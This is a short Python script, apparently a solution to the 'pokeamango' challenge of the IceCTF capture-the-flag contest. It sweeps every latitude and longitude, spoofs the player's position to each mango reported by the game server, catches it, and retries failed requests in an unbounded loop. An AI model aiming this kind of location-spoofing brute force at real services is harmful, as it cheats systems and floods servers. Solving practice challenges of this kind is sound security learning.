import requests

UUID = 'dd63640c-0efb-4d4e-ae5a-577544047759'

def post_until_ok(url, data=None, json=None, **kwargs):
	while True:
		r = requests.post(url, data, json, **kwargs)
		if r.status_code == requests.codes.ok:
			return r


for lat in range(-90, 91):
	for lng in range(-180, 180):
		print(lat, lng)

		r = post_until_ok('http://pokeamango.vuln.icec.tf/mango/list', {'lat': lat, 'long': lng, 'uuid': UUID})

		mangos = r.json()['mangos']
		print(mangos)

		for mango in mangos:
			r = post_until_ok('http://pokeamango.vuln.icec.tf/mango/catch', {'curLat': lat, 'curLong': lng, 'mangoLat': mango['lat'], 'mangoLong': mango['lng'], 'uuid': UUID})

			r = post_until_ok('http://pokeamango.vuln.icec.tf/mango/count', {'uuid': UUID})

			res = r.json()
			print(res['count'])
